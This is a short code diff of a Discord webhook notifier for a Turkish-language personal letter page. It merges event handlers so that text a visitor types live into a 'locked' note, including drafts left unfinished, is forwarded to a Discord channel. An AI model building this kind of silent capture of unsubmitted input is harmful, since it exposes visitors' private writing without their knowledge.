@@ -119,14 +119,10 @@ export async function sendDiscordWebhook(
       title = '🔥💥 /last MEKTUP VE SAYFA KİBRİTLE YAKILDI!';
       color = 16711680; // Bright Fire Red
       description = 'Ayşenur kibriti zımparaya sürttü! Alevler tüm mektubu ve sayfayı yakarak küllere çevirdi!';
-    } else if (eventType === 'last_lock_clicked') {
-      title = '🔒 /last "Bir notla birlikte kilitle" Formu Açıldı';
+    } else if (eventType === 'last_lock_clicked' || eventType === 'last_note_draft_update' || eventType === 'last_note_draft_abandoned') {
+      title = data.noteText ? '🟢 /last "Mektubu Sakla" Formu & Canlı Nota Yazılan Metin' : '🟢 /last "Mektubu Sakla" Formu Açıldı';
       color = 3462041; // Emerald Green
-      description = 'Ziyaretçi "Bir notla birlikte kilitle" butonuna bastı ve nota tarih seçip kilitleme alanını açtı.';
-    } else if (eventType === 'last_note_draft_update' || eventType === 'last_note_draft_abandoned') {
-      title = eventType === 'last_note_draft_abandoned' ? '⚠️ /last Kilitli Not Yazılırken Sekme Kapandı' : '✍️ /last Kilitli Not Canlı Yazılıyor';
-      color = 16478608; // Rose
-      description = eventType === 'last_note_draft_abandoned' ? 'Ziyaretçi kilitli nota yazı yazarken sayfayı kapattı. En son hali:' : 'Ziyaretçi kilitli nota yazı yazıyor:';
+      description = data.noteText ? 'Ziyaretçi "Mektubu Sakla" butonuna bastı ve nota canlı olarak yazı yazıyor:' : 'Ziyaretçi "Mektubu Sakla" butonuna bastı ve kilitli not yazma alanını açtı.';
     } else if (eventType === 'last_note_locked') {
       title = '🔒✉️ /last Mektup Mühürlendi, Not Ekledi ve Kriptolandı!';
       color = 3462041; // Emerald Green
